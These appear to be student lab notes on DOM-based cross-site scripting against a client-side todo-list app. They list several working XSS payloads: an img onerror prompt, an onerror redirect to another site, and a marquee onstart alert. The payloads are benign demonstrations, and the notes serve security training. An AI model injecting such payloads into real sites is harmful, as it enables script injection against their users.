## XSS - DOM Lab
### App Normal Functionality
- A todo list that you can add items to
- Add `Study XSS` and it gets rendered to the page
- There are no requests being made when adding item to list
- Everything happens in the client

### Try Inputs for Different Behavior
- Add `<script>prompt(1)</script>` and an empty item is added to the list
- This script is not being called, it needs a trigger
- Add `<img src=x onerror="prompt(1)">` which triggers the prompt because the image fails to load
- Add `<img src=x onerror=" window.location.href='https://tcm-sec.com'">` and we get forwarded
- Add `<marquee onstart="alert(1)">XSS</marquee>` and 'XSS' marquees across the page
